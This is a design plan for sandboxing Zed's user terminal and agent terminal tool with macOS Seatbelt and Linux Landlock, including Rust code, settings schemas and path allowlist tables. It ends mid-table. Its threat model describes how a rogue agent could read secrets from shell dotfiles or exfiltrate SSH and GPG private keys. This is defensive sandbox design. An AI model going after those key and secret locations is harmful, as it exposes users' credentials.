# Terminal Sandboxing Design Plan

## Overview

This plan describes a sandboxing system for Zed's terminal, covering both the interactive user terminal and the agent's terminal tool. The sandbox restricts which directories the shell process can access and which environment variables it receives, using OS-level kernel-enforced mechanisms on macOS and Linux.

**Goals:**
- A user can enable sandboxing in Zed settings and have total confidence that the terminal (and/or the agent's terminal tool) cannot access any directories outside the project, other than the ones they've explicitly allowed.
- Environment variables are filtered: only explicitly allowed env vars are passed to the shell.
- The sandbox is invisible to the user — same shell, same tools, same paths. The only observable difference is that accessing disallowed paths fails with a permission error.
- No third-party dependencies. Both mechanisms (macOS Seatbelt and Linux Landlock) are built into the OS kernel.

**Non-goals (for this phase):**
- Windows sandboxing. Windows lacks a clean process-scoped filesystem restriction mechanism. The options (AppContainer with DACL mutation, WSL2 with Landlock) are deferred to a future phase.
- Container-based isolation. This plan covers per-process sandboxing only.

---

## Platform Mechanisms

### macOS: Seatbelt (`sandbox_init`)

macOS provides `sandbox_init()` from `<sandbox.h>`. It takes a policy string written in SBPL (Sandbox Profile Language) and applies it to the calling process. Key properties:

- Applied inside the child process after `fork()`, before `exec()`.
- Once applied, the sandbox **cannot be removed or loosened**, only tightened.
- **Inherited by all child processes** — the shell and everything it spawns is sandboxed.
- Enforced at the **kernel level** by `Sandbox.kext`. There is no userspace bypass.
- No host state is mutated. The sandbox is purely process-scoped. No cleanup needed.
- The API is technically deprecated by Apple but still works on all macOS versions, is used extensively by Apple's own system services (Safari tab sandboxing, mDNSResponder, etc.), and has no public replacement.

### Linux: Landlock

Landlock is a Linux Security Module for unprivileged application sandboxing. It uses three syscalls:

1. `landlock_create_ruleset()` — Create a ruleset, declaring which access types are controlled (deny-by-default for anything "handled").
2. `landlock_add_rule()` — Add allow-rules: "this directory hierarchy gets these access rights."
3. `landlock_restrict_self()` — Enforce the ruleset. **Inherited by all children.** Cannot be removed or weakened.

Key properties:

- Requires `prctl(PR_SET_NO_NEW_PRIVS, 1)` before `landlock_restrict_self()`. This prevents the process from gaining privileges via setuid binaries (so `sudo` will not work inside a sandboxed terminal — this is desirable).
- Available since kernel 5.13 (June 2021). Enabled by default in all major distros: Ubuntu 22.04+, Fedora 36+, Debian 12+, Arch, RHEL 9, openSUSE Tumbleweed, NixOS.
- The `landlock` Rust crate (on crates.io) provides a safe, idiomatic API with built-in graceful degradation: `RulesetStatus::FullyEnforced`, `PartiallyEnforced`, or `NotEnforced`.
- No host state is mutated. No cleanup needed.
- **Important**: Shared libraries must have **execute** permission (not just read) because `mmap()` with `PROT_EXEC` is how `ld-linux.so` loads `.so` files. Any path containing shared libraries needs read+execute, not just read-only.

---

## Integration Point

Both the user terminal and the agent terminal tool converge at `TerminalBuilder::new()` in `crates/terminal/src/terminal.rs`, which builds `alacritty_terminal::tty::Options` and calls `tty::new()`. The `tty::new()` function (in Zed's fork of alacritty at `alacritty_terminal/src/tty/unix.rs`) creates a PTY and spawns the shell using `std::process::Command` with a `pre_exec` hook.

The `pre_exec` hook runs **after `fork()` but before `exec()`** — this is exactly when both `sandbox_init()` (macOS) and Landlock (Linux) must be applied.

Current `pre_exec` hook in the alacritty fork (`alacritty_terminal/src/tty/unix.rs`):

```rust
unsafe {
    builder.pre_exec(move || {
        let err = libc::setsid();
        if err == -1 {
            return Err(Error::other("Failed to set session id"));
        }
        if let Some(working_directory) = working_directory.as_ref() {
            let _ = env::set_current_dir(working_directory);
        }
        set_controlling_terminal(slave_fd);
        libc::close(slave_fd);
        libc::close(master_fd);
        libc::signal(libc::SIGCHLD, libc::SIG_DFL);
        libc::signal(libc::SIGHUP, libc::SIG_DFL);
        libc::signal(libc::SIGINT, libc::SIG_DFL);
        libc::signal(libc::SIGQUIT, libc::SIG_DFL);
        libc::signal(libc::SIGTERM, libc::SIG_DFL);
        libc::signal(libc::SIGALRM, libc::SIG_DFL);
        Ok(())
    });
}
```

The sandbox call must be inserted **after** `set_controlling_terminal` (which needs PTY device access) and **after** closing the master/slave fds, but **before** `exec()` happens (which is implicit when `pre_exec` returns and the `Command` proceeds to exec).

### Two terminal code paths

The user terminal and agent terminal tool follow **separate code paths** that converge at `TerminalBuilder`:

| | User Terminal | Agent Terminal Tool |
|---|---|---|
| Entry point | `Project::create_terminal_shell_internal` | `create_terminal_entity` in `acp_thread/src/terminal.rs` |
| Shell | User's configured `terminal.shell` | Hard-coded `/bin/sh` via `get_default_system_shell_preferring_bash()` |
| Stdin | Normal | Redirected to `/dev/null` |
| Both converge at | `TerminalBuilder::new(...)` | `TerminalBuilder::new(...)` (via `Project::create_terminal_task`) |

The `apply_to` setting controls which path gets sandboxed. Each path checks the setting before passing a `SandboxConfig` to `TerminalBuilder::new()`.

---

## Settings Schema

### Rust types

Add to `crates/settings_content/src/terminal.rs`, as a new field on `ProjectTerminalSettingsContent` (so it's available in both user settings and project-level `.zed/settings.json`):

```rust
#[derive(Debug, Default, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct SandboxSettingsContent {
    /// Whether terminal sandboxing is enabled.
    /// Default: false
    pub enabled: Option<bool>,

    /// Which terminal types get sandboxed.
    /// - "terminal": only the user's interactive terminal panel
    /// - "tool": only the agent's terminal tool
    /// - "both": both
    /// - "neither": sandbox settings are defined but not applied
    /// Default: "both"
    pub apply_to: Option<SandboxApplyTo>,

    /// System paths the shell needs to function. These have OS-specific
    /// defaults built into Zed. Set a category to an explicit array to
    /// replace the default. Set to [] to deny all access of that type.
    /// Leave as null to use the OS-specific default.
    pub system_paths: Option<SystemPathsSettingsContent>,

    /// Additional directories to allow read+execute access to (binaries, toolchains).
    /// These are for user-specific tool directories, not system paths.
    pub additional_executable_paths: Option<Vec<String>>,

    /// Additional directories to allow read-only access to.
    pub additional_read_only_paths: Option<Vec<String>>,

    /// Additional directories to allow read+write access to.
    pub additional_read_write_paths: Option<Vec<String>>,

    /// Whether to allow network access from the sandboxed terminal.
    /// Default: true
    pub allow_network: Option<bool>,

    /// Environment variables to pass through to the sandboxed terminal.
    /// All other env vars from the parent process are stripped.
    /// Default: ["PATH", "HOME", "USER", "SHELL", "LANG", "TERM", "TERM_PROGRAM",
    ///           "CARGO_HOME", "RUSTUP_HOME", "GOPATH", "EDITOR", "VISUAL",
    ///           "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_RUNTIME_DIR",
    ///           "SSH_AUTH_SOCK", "GPG_TTY", "COLORTERM"]
    pub allowed_env_vars: Option<Vec<String>>,
}

#[derive(Debug, Default, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct SystemPathsSettingsContent {
    /// Paths with read+execute access (binaries, shared libraries).
    /// Default (macOS): ["/bin", "/usr/bin", "/usr/sbin", "/sbin", "/usr/lib",
    ///   "/usr/libexec", "/System/Library/dyld", "/System/Cryptexes",
    ///   "/Library/Developer/CommandLineTools/usr/bin",
    ///   "/Library/Developer/CommandLineTools/usr/lib",
    ///   "/Library/Apple/usr/bin",
    ///   "/opt/homebrew/bin", "/opt/homebrew/sbin", "/opt/homebrew/Cellar",
    ///   "/opt/homebrew/lib", "/usr/local/bin", "/usr/local/lib"]
    /// Default (Linux): ["/usr/bin", "/usr/sbin", "/usr/lib", "/usr/lib64",
    ///   "/usr/libexec", "/lib", "/lib64", "/bin", "/sbin"]
    pub executable: Option<Vec<String>>,

    /// Paths with read-only access (config files, data, certificates).
    /// Default (macOS): ["/private/etc", "/usr/share", "/System/Library/Keychains",
    ///   "/Library/Developer/CommandLineTools/SDKs",
    ///   "/Library/Preferences/SystemConfiguration",
    ///   "/opt/homebrew/share", "/opt/homebrew/etc",
    ///   "/usr/local/share", "/usr/local/etc"]
    /// Default (Linux): ["/etc", "/usr/share", "/usr/include", "/usr/lib/locale"]
    pub read_only: Option<Vec<String>>,

    /// Paths with read+write access (devices, temp directories, IPC sockets).
    /// Default (macOS): ["/dev", "/private/tmp", "/var/folders",
    ///   "/private/var/run/mDNSResponder"]
    /// Default (Linux): ["/dev", "/tmp", "/var/tmp", "/dev/shm", "/run/user"]
    pub read_write: Option<Vec<String>>,
}

#[derive(Debug, Default, Clone, Copy, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum SandboxApplyTo {
    Terminal,
    Tool,
    #[default]
    Both,
    Neither,
}
```

Add to `ProjectTerminalSettingsContent`:

```rust
pub struct ProjectTerminalSettingsContent {
    // ... existing fields ...
    pub sandbox: Option<SandboxSettingsContent>,
}
```

### Example user settings (settings.json)

Basic usage:

```json
{
  "terminal": {
    "sandbox": {
      "enabled": true,
      "apply_to": "both",
      "additional_executable_paths": ["~/.cargo/bin", "~/.rustup/toolchains", "~/.local/bin"],
      "additional_read_only_paths": ["~/.ssh"],
      "additional_read_write_paths": ["~/.cargo/registry", "~/.cargo/git", "~/.cache"],
      "allow_network": true,
      "allowed_env_vars": [
        "PATH", "HOME", "USER", "SHELL", "LANG", "TERM", "TERM_PROGRAM",
        "CARGO_HOME", "RUSTUP_HOME", "GOPATH", "EDITOR", "VISUAL",
        "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_RUNTIME_DIR",
        "SSH_AUTH_SOCK", "GPG_TTY", "COLORTERM"
      ]
    }
  }
}
```

### OS-specific overrides

Zed has a built-in platform override system. Top-level `"macos"`, `"linux"`, and `"windows"` keys in settings.json contain the same settings structure, and their values override the base settings on that platform.

To customize `system_paths` per platform, users use this existing mechanism:

```json
{
  "terminal": {
    "sandbox": {
      "enabled": true,
      "apply_to": "both",
      "additional_executable_paths": ["~/.cargo/bin", "~/.rustup/toolchains"],
      "additional_read_only_paths": ["~/.ssh"],
      "additional_read_write_paths": ["~/.cargo/registry", "~/.cargo/git"]
    }
  },

  "macos": {
    "terminal": {
      "sandbox": {
        "system_paths": {
          "executable": [
            "/bin", "/usr/bin", "/usr/sbin", "/sbin",
            "/usr/lib", "/usr/libexec",
            "/System/Library/dyld", "/System/Cryptexes",
            "/Library/Developer/CommandLineTools/usr/bin",
            "/Library/Developer/CommandLineTools/usr/lib"
          ]
        }
      }
    }
  },

  "linux": {
    "terminal": {
      "sandbox": {
        "system_paths": {
          "executable": [
            "/usr/bin", "/usr/lib", "/usr/lib64",
            "/lib", "/lib64", "/bin"
          ]
        }
      }
    }
  }
}
```

When a `system_paths` subcategory is `null` (the default), Zed uses the built-in OS-specific default. When the user sets it to an explicit array, that **replaces** the default entirely. Only the overridden category is replaced — the other categories keep their defaults.

---

## Resolved Config Types

At runtime, `Option`-wrapped settings are resolved into concrete types with all defaults applied:

```rust
pub struct SandboxConfig {
    pub project_dir: PathBuf,
    pub system_paths: ResolvedSystemPaths,
    pub additional_executable_paths: Vec<PathBuf>,
    pub additional_read_only_paths: Vec<PathBuf>,
    pub additional_read_write_paths: Vec<PathBuf>,
    pub allow_network: bool,
    pub allowed_env_vars: Vec<String>,
}

pub struct ResolvedSystemPaths {
    pub executable: Vec<PathBuf>,
    pub read_only: Vec<PathBuf>,
    pub read_write: Vec<PathBuf>,
}
```

Default resolution:

```rust
impl ResolvedSystemPaths {
    pub fn from_settings(settings: &SystemPathsSettingsContent) -> Self {
        Self {
            executable: settings.executable
                .clone()
                .map(|v| v.into_iter().map(PathBuf::from).collect())
                .unwrap_or_else(Self::default_executable),
            read_only: settings.read_only
                .clone()
                .map(|v| v.into_iter().map(PathBuf::from).collect())
                .unwrap_or_else(Self::default_read_only),
            read_write: settings.read_write
                .clone()
                .map(|v| v.into_iter().map(PathBuf::from).collect())
                .unwrap_or_else(Self::default_read_write),
        }
    }
}
```

The `default_*` methods use `#[cfg(target_os = "macos")]` and `#[cfg(target_os = "linux")]` to return the appropriate OS-specific paths. See the "System Path Baselines" section below for the full lists.

---

## macOS Implementation: Seatbelt

### FFI bindings

Create a new file in the alacritty fork (or in `crates/terminal/src/`):

```rust
#[cfg(target_os = "macos")]
mod seatbelt {
    use std::ffi::{CStr, CString};
    use std::io::{Error, Result};
    use std::os::raw::c_char;

    extern "C" {
        fn sandbox_init(profile: *const c_char, flags: u64, errorbuf: *mut *mut c_char) -> i32;
        fn sandbox_free_error(errorbuf: *mut c_char);
    }

    /// Apply a Seatbelt sandbox profile to the current process.
    /// Must be called after fork(), before exec().
    /// The profile is an SBPL (Sandbox Profile Language) string.
    pub fn apply_sandbox(profile: &str) -> Result<()> {
        let profile_cstr = CString::new(profile)
            .map_err(|_| Error::other("sandbox profile contains null byte"))?;
        let mut errorbuf: *mut c_char = std::ptr::null_mut();

        let ret = unsafe { sandbox_init(profile_cstr.as_ptr(), 0, &mut errorbuf) };

        if ret == 0 {
            return Ok(());
        }

        let msg = if !errorbuf.is_null() {
            let s = unsafe { CStr::from_ptr(errorbuf) }.to_string_lossy().into_owned();
            unsafe { sandbox_free_error(errorbuf) };
            s
        } else {
            "unknown sandbox error".to_string()
        };
        Err(Error::other(format!("sandbox_init failed: {msg}")))
    }
}
```

### SBPL profile generation

The profile is generated dynamically from the `SandboxConfig`:

```rust
fn generate_sbpl_profile(config: &SandboxConfig) -> String {
    let mut p = String::from("(version 1)\n(deny default)\n");

    // Process lifecycle
    p.push_str("(allow process-exec)\n");
    p.push_str("(allow process-fork)\n");
    p.push_str("(allow signal)\n");

    // System services needed for basic operation
    p.push_str("(allow mach-lookup)\n");   // IPC (needed for DNS, system services)
    p.push_str("(allow sysctl-read)\n");   // Kernel parameter reads
    p.push_str("(allow iokit-open)\n");    // IOKit (needed for some device access)

    // System executable paths (read + execute)
    for path in &config.system_paths.executable {
        write!(p, "(allow file-read* process-exec (subpath \"{}\"))\n",
            path.display()).unwrap();
    }

    // System read-only paths
    for path in &config.system_paths.read_only {
        write!(p, "(allow file-read* (subpath \"{}\"))\n",
            path.display()).unwrap();
    }

    // System read+write paths (devices, temp dirs, IPC)
    for path in &config.system_paths.read_write {
        write!(p, "(allow file-read* file-write* (subpath \"{}\"))\n",
            path.display()).unwrap();
    }

    // Project directory: full access
    write!(p, "(allow file-read* file-write* (subpath \"{}\"))\n",
        config.project_dir.display()).unwrap();

    // User-configured additional paths
    for path in &config.additional_executable_paths {
        write!(p, "(allow file-read* process-exec (subpath \"{}\"))\n",
            path.display()).unwrap();
    }
    for path in &config.additional_read_only_paths {
        write!(p, "(allow file-read* (subpath \"{}\"))\n",
            path.display()).unwrap();
    }
    for path in &config.additional_read_write_paths {
        write!(p, "(allow file-read* file-write* (subpath \"{}\"))\n",
            path.display()).unwrap();
    }

    // User shell config files: read-only access to $HOME dotfiles
    // These are needed for shell startup but should not be writable.
    if let Some(home) = dirs::home_dir() {
        for dotfile in &[
            ".zshrc", ".zshenv", ".zprofile", ".zlogin", ".zlogout",
            ".bashrc", ".bash_profile", ".bash_login", ".profile",
            ".inputrc", ".terminfo",
            ".gitconfig",
        ] {
            let path = home.join(dotfile);
            if path.exists() {
                write!(p, "(allow file-read* (literal \"{}\"))\n",
                    path.display()).unwrap();
            }
        }
        // XDG config directories
        let config_dir = home.join(".config");
        if config_dir.exists() {
            write!(p, "(allow file-read* (subpath \"{}\"))\n",
                config_dir.display()).unwrap();
        }
    }

    // Network
    if config.allow_network {
        p.push_str("(allow network-outbound)\n");
        p.push_str("(allow network-inbound)\n");
        p.push_str("(allow system-socket)\n");
    }

    p
}
```

### Integration into pre_exec

In `alacritty_terminal/src/tty/unix.rs`, inside the `pre_exec` closure:

```rust
// After set_controlling_terminal and closing fds, before signal setup:
#[cfg(target_os = "macos")]
if let Some(ref sandbox_config) = config.sandbox {
    let profile = generate_sbpl_profile(sandbox_config);
    seatbelt::apply_sandbox(&profile)?;
}
```

---

## Linux Implementation: Landlock

### Crate dependency

Add to the alacritty fork's `Cargo.toml`:

```toml
[target.'cfg(target_os = "linux")'.dependencies]
landlock = "0.4"
```

### Landlock ruleset construction

```rust
#[cfg(target_os = "linux")]
mod landlock_sandbox {
    use landlock::{
        ABI, Access, AccessFs, PathBeneath, PathFd,
        Ruleset, RulesetAttr, RulesetCreatedAttr, RulesetStatus,
    };
    use std::io::{Error, Result};
    use std::path::Path;

    const TARGET_ABI: ABI = ABI::V5;

    fn fs_read() -> AccessFs {
        AccessFs::ReadFile | AccessFs::ReadDir
    }

    fn fs_read_exec() -> AccessFs {
        fs_read() | AccessFs::Execute
    }

    fn fs_all() -> AccessFs {
        AccessFs::from_all(TARGET_ABI)
    }

    fn add_path_rule(
        ruleset: landlock::RulesetCreated,
        path: &Path,
        access: AccessFs,
    ) -> std::result::Result<landlock::RulesetCreated, landlock::RulesetError> {
        match PathFd::new(path) {
            Ok(fd) => ruleset.add_rule(PathBeneath::new(fd, access)),
            Err(e) => {
                // Path doesn't exist — skip it (e.g., /opt/homebrew on non-Homebrew systems)
                log::debug!("Landlock: skipping nonexistent path {}: {e}", path.display());
                Ok(ruleset)
            }
        }
    }

    pub fn apply_sandbox(config: &SandboxConfig) -> Result<()> {
        // PR_SET_NO_NEW_PRIVS is required before landlock_restrict_self.
        // It prevents the process from gaining privileges via setuid binaries.
        let ret = unsafe { libc::prctl(libc::PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) };
        if ret != 0 {
            return Err(Error::last_os_error());
        }

        let mut ruleset = Ruleset::default()
            .handle_access(AccessFs::from_all(TARGET_ABI))
            .map_err(|e| Error::other(format!("landlock ruleset create: {e}")))?
            .create()
            .map_err(|e| Error::other(format!("landlock ruleset init: {e}")))?;

        // System executable paths (read + execute)
        for path in &config.system_paths.executable {
            ruleset = add_path_rule(ruleset, path, fs_read_exec())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }

        // System read-only paths
        for path in &config.system_paths.read_only {
            ruleset = add_path_rule(ruleset, path, fs_read())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }

        // System read+write paths
        for path in &config.system_paths.read_write {
            ruleset = add_path_rule(ruleset, path, fs_all())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }

        // Project directory: full access
        ruleset = add_path_rule(ruleset, &config.project_dir, fs_all())
            .map_err(|e| Error::other(format!("landlock project rule: {e}")))?;

        // User-configured paths
        for path in &config.additional_executable_paths {
            ruleset = add_path_rule(ruleset, path, fs_read_exec())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }
        for path in &config.additional_read_only_paths {
            ruleset = add_path_rule(ruleset, path, fs_read())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }
        for path in &config.additional_read_write_paths {
            ruleset = add_path_rule(ruleset, path, fs_all())
                .map_err(|e| Error::other(format!("landlock rule: {e}")))?;
        }

        // Shell config dotfiles: read-only
        if let Some(home) = dirs::home_dir() {
            for dotfile in &[
                ".bashrc", ".bash_profile", ".bash_login", ".profile",
                ".zshrc", ".zshenv", ".zprofile", ".zlogin", ".zlogout",
                ".inputrc", ".terminfo", ".gitconfig",
            ] {
                let path = home.join(dotfile);
                if path.exists() {
                    ruleset = add_path_rule(ruleset, &path, fs_read())
                        .map_err(|e| Error::other(format!("landlock dotfile rule: {e}")))?;
                }
            }
            let config_dir = home.join(".config");
            if config_dir.exists() {
                ruleset = add_path_rule(ruleset, &config_dir, fs_read())
                    .map_err(|e| Error::other(format!("landlock .config rule: {e}")))?;
            }
            // /proc/self for bash process substitution
            let proc_self = Path::new("/proc/self");
            if proc_self.exists() {
                ruleset = add_path_rule(ruleset, proc_self, fs_read())
                    .map_err(|e| Error::other(format!("landlock /proc/self rule: {e}")))?;
            }
        }

        let status = ruleset.restrict_self()
            .map_err(|e| Error::other(format!("landlock restrict_self: {e}")))?;

        match status.ruleset {
            RulesetStatus::FullyEnforced => {
                log::info!("Landlock sandbox fully enforced");
            }
            RulesetStatus::PartiallyEnforced => {
                log::warn!("Landlock sandbox partially enforced (older kernel ABI)");
            }
            RulesetStatus::NotEnforced => {
                log::warn!("Landlock not supported on this kernel; running unsandboxed");
            }
        }

        Ok(())
    }
}
```

### Integration into pre_exec

Same location as macOS, but `#[cfg(target_os = "linux")]`:

```rust
#[cfg(target_os = "linux")]
if let Some(ref sandbox_config) = config.sandbox {
    landlock_sandbox::apply_sandbox(sandbox_config)?;
}
```

---

## Environment Variable Filtering

Env var filtering happens in `TerminalBuilder::new()` (in `crates/terminal/src/terminal.rs`), where the environment HashMap is assembled before being passed to the alacritty tty options.

Currently, `env` is a `HashMap<String, String>` that inherits the parent's environment and adds/removes a few keys. When sandbox is enabled:

1. **In `TerminalBuilder::new()`**, after the env HashMap is built, filter it:

```rust
if let Some(ref sandbox) = sandbox_config {
    let allowed: HashSet<&str> = sandbox.allowed_env_vars.iter()
        .map(|s| s.as_str()).collect();
    env.retain(|key, _| allowed.contains(key.as_str()));
}
```

2. **In the alacritty fork's `tty::unix::from_fd()`**, when sandbox is enabled, call `builder.env_clear()` before setting env vars. This ensures the child doesn't inherit any env from the parent that wasn't explicitly passed through:

```rust
if config.sandbox.is_some() {
    builder.env_clear();
}
// Then set the filtered env vars as normal:
for (key, value) in &config.env {
    builder.env(key, value);
}
```

The Zed-specific env vars inserted by `insert_zed_terminal_env()` (like `ZED_TERM`, `TERM_PROGRAM`) should always be added regardless of the allowlist — they're not from the parent environment.

---

## System Path Baselines

### macOS defaults

#### `executable` (read + execute)

| Path | Why | Security notes |
|---|---|---|
| `/bin` | Core utilities (`sh`, `zsh`, `ls`, `cat`, `cp`, `rm`, `mkdir`, etc.) | Apple-signed system binaries. A rogue agent can run `rm` but can only delete files within writable sandbox paths. |
| `/usr/bin` | Standard tools (`env`, `git`, `grep`, `sed`, `awk`, `ssh`, `less`, etc.) | Same. `ssh` could connect outward if network is allowed, but can't read `~/.ssh` keys unless explicitly allowlisted. |
| `/usr/sbin`, `/sbin` | System admin tools | Rarely needed but some scripts reference them. Harmless — read+exec only. |
| `/usr/lib` | Shared libraries, `dyld` | Read+exec only. Cannot modify. |
| `/usr/libexec` | Helper binaries (`path_helper`, git helpers) | Single-purpose executables. |
| `/System/Library/dyld` | dyld shared cache (`dyld_shared_cache_arm64e`). On macOS 11+ most `/usr/lib/*.dylib` are stubs; real code lives here. | Binary cache data. No meaningful data to exfiltrate. |
| `/System/Cryptexes` | Cryptex-delivered OS components (macOS 13+) | Same. |
| `/Library/Developer/CommandLineTools/usr/bin` | Real `git`, `clang`, `make`, `ld` (behind Xcode shims in `/usr/bin`) | Same security profile as `/usr/bin`. |
| `/Library/Developer/CommandLineTools/usr/lib` | Xcode toolchain support libraries | Read+exec only. |
| `/Library/Apple/usr/bin` | Apple-provided binaries | Read+exec only. |
| `/opt/homebrew/bin`, `/opt/homebrew/sbin` | Homebrew-installed tools (Apple Silicon) | User-installed binaries. Can only affect files within writable sandbox paths. |
| `/opt/homebrew/Cellar` | Actual Homebrew formula files (binaries within need exec) | Read+exec only. |
| `/opt/homebrew/lib` | Homebrew shared libraries (`.dylib`) | Read+exec for dynamic linking. |
| `/usr/local/bin`, `/usr/local/lib` | Intel Homebrew / manually installed tools and libraries | Same as `/opt/homebrew/*`. |

#### `read_only`

| Path | Why | Security notes |
|---|---|---|
| `/private/etc` (aliased as `/etc`) | Shell configs (`zshrc`, `profile`, `paths`, `paths.d/*`), DNS (`resolv.conf`, `hosts`, `nsswitch.conf`), SSL certs (`ssl/cert.pem`, `ssl/certs/`), user database (`passwd`, `group`), `ld.so.cache`. | World-readable on a normal macOS system. `/etc/passwd` contains usernames and home dirs but not passwords. A rogue agent can read DNS server IPs from `resolv.conf`. |
| `/usr/share` | Terminfo database, zsh functions/completions, locale data, man pages, misc data | Static data files. No risk. |
| `/System/Library/Keychains` | System root certificates and trust settings | Read-only. Needed for TLS certificate verification. |
| `/Library/Developer/CommandLineTools/SDKs` | macOS SDK headers and libraries | Large but read-only. Needed by compilers. |
| `/Library/Preferences/SystemConfiguration` | Network configuration (proxy settings) | Read-only. Reveals network config. |
| `/opt/homebrew/share`, `/opt/homebrew/etc` | Homebrew shared data and config | Read-only. |
| `/usr/local/share`, `/usr/local/etc` | Intel Homebrew shared data and config | Read-only. |

#### `read_write`

| Path | Why | Security notes |
|---|---|---|
| `/dev` | Device nodes: `/dev/null`, `/dev/zero`, `/dev/urandom`, `/dev/random` (kernel pseudo-devices), `/dev/tty` (controlling terminal), `/dev/pty*` and `/dev/tty*` (PTY devices for the terminal itself) | Zero risk for pseudo-devices. PTY access is required for the shell to function. |
| `/private/tmp` (aliased as `/tmp`) | Temp files. Compilers, build tools, `mktemp` all use this. | **Medium concern.** Any process on the system can read `/tmp`. A rogue agent could write data here that other processes might read, or read temp files from other processes. But this is true of any process on the system today. The sandbox doesn't make this worse. |
| `/var/folders` | Per-user temp/cache directory (contains `$TMPDIR`). Compilers (`rustc`, `clang`) write intermediate files here. | Same concern as `/tmp` but slightly more contained (per-user). Without write access here, most compilation fails. |
| `/private/var/run/mDNSResponder` | Unix domain socket for macOS DNS resolution. All DNS lookups on macOS go through `mDNSResponder`. | Required if `allow_network` is true. The socket only accepts DNS queries. |

### Linux defaults

#### `executable` (read + execute)

| Path | Why | Security notes |
|---|---|---|
| `/usr/bin` | Standard tools (`bash`, `zsh`, `git`, `grep`, `make`, etc.) | Distro-packaged signed binaries. Same as macOS `/usr/bin`. |
| `/usr/sbin` | System admin tools | Rarely needed. `sudo` won't work due to `NO_NEW_PRIVS`. |
| `/usr/lib`, `/usr/lib64` | Shared libraries (glibc, libssl, libcurl, etc.). **Must be executable** because `mmap(PROT_EXEC)` is how shared libraries are loaded by `ld-linux.so`. | No write access. |
| `/lib`, `/lib64` | Core libraries (glibc, `ld-linux.so`). On many modern distros these symlink to `/usr/lib`. | Same as `/usr/lib`. |
| `/usr/libexec` | Helper binaries (git sub-commands, etc.) | Same as `/usr/bin`. |
| `/bin`, `/sbin` | On older distros these are separate from `/usr/bin`. On modern distros they're symlinks. | Same as `/usr/bin`. |

#### `read_only`

| Path | Why | Security notes |
|---|---|---|
| `/etc` | Shell configs (`profile`, `bash.bashrc`, `profile.d/*`, `zsh/`), DNS (`resolv.conf`, `hosts`, `nsswitch.conf`, `gai.conf`), SSL certs (`ssl/certs/`, `pki/tls/`), `passwd`, `group`, `ld.so.cache`, `localtime`, `timezone`, `environment`, `shells` | Same as macOS. `/etc/shadow` (password hashes) is root-readable only, so the sandbox can't read it even with `/etc` allowed. |
| `/usr/share` | Terminfo, locale data, zoneinfo, man pages, git templates, zsh functions, `ca-certificates/` | Static data files. |
| `/usr/include` | C/C++ headers (needed by `-sys` crates with build scripts, `cc` crate) | Read-only. |
| `/usr/lib/locale` | Compiled locale data (`locale-archive`) | Read-only. |

#### `read_write`

| Path | Why | Security notes |
|---|---|---|
| `/dev` | Device nodes: `/dev/null`, `/dev/zero`, `/dev/urandom`, `/dev/random`, `/dev/tty`, `/dev/pts/` + `/dev/ptmx` (PTY allocation), `/dev/fd/` (symlink to `/proc/self/fd/`, needed for bash process substitution), `/dev/stdin`, `/dev/stdout`, `/dev/stderr` | Zero risk for pseudo-devices. PTY access required. On Landlock ABI v5+, `IOCTL_DEV` permission is also needed for terminal control operations on `/dev/tty` and `/dev/pts/*`. |
| `/tmp` | Temp files | Same concern as macOS `/tmp`. |
| `/var/tmp` | Persistent temp files (survive reboot) | Same. |
| `/dev/shm` | POSIX shared memory. Used by some IPC, Python multiprocessing. | Low-medium concern. SHM segments are visible across processes but have standard POSIX permissions. |
| `/run/user` | `$XDG_RUNTIME_DIR`. Used by D-Bus, systemd user services, some IPC sockets. | Per-user directory with `0700` permissions. |

### User home directory paths

On both platforms, shell config dotfiles are granted **read-only** access automatically (not via `system_paths` but as part of the sandbox setup logic). These are:

- `~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`
- `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`
- `~/.inputrc`, `~/.terminfo`
- `~/.gitconfig`
- `~/.config/` (XDG config directory, read-only)

**Security concern:** If a user's `.zshrc` or `.bashrc` contains secrets (API tokens, passwords in env var exports), the sandboxed process can read them. This is a real but unavoidable risk — without these files, the shell starts in a severely degraded state (no PATH modifications, no prompt, no aliases). Users should be advised not to store secrets in shell config files.

### Paths NOT in any default baseline

These paths are commonly needed but intentionally excluded. The user must explicitly add them:

| Path | Why excluded | What breaks without it | How to add |
|---|---|---|---|
| `~/.ssh` | Contains private keys (`id_ed25519`, `id_rsa`). A rogue agent with read access could exfiltrate them. | `git clone git@github.com:...` fails (can't read keys). `ssh` to servers fails. | `"additional_read_only_paths": ["~/.ssh"]` |
| `~/.gnupg` | Contains GPG private keys | `git commit -S` (signed commits) fails. | `"additional_read_only_paths": ["~/.gnupg"]` |
| `~/.cargo/registry`, `~/.cargo/git` | Writable crate cache. Needed for downloading dependencies. | `cargo build` can't download new dependencies (reads from existing cache work if added as read-only). | `"additional_read_write_paths": ["~/.cargo/registry", "~/.cargo/git"]` |
| `~/.cargo/bin`, `~/.rustup/toolchains` | Rust toolchain binaries | `cargo`, `rustc` not found. | `"additional_executable_paths": ["~/.cargo/bin", "~/.rustup/toolchains"]` |
| `~/.npm`, `~/.cache` | Package manager caches | `npm install` can't cache. Various tools lose caching. | `"additional_read_write_paths": ["~/.npm", "~/.cache"]` |
| `~/.local/bin` | User-local binaries (`pip install --user`, etc.) | User-installed tools not found. | `"additional_executable_paths": ["~/.local/bin"]` |
| `~/.nvm`, `~/.volta`, `~/.pyenv`, `~/.rbenv`, `~/.asdf` | Language version managers | Managed language runtimes not found. | `"additional_executable_paths": ["~/.nvm"]` etc. |
| `~/Library/Keychains` (macOS) | macOS Keychain | Apps using Keychain for credential storage. | `"additional_read_only_paths": ["~/Library/Keychains"]` |

---

## What a Rogue Agent Can and Cannot Do

With the default baseline and no user-added paths:

| Action | Allowed? | Why |
|---|---|---|
| Read/write files in the project directory | ✅ | That's the whole point. |
| Run `ls`, `cat`, `grep`, `git status` in the project | ✅ | System binaries in `/usr/bin` are executable. |
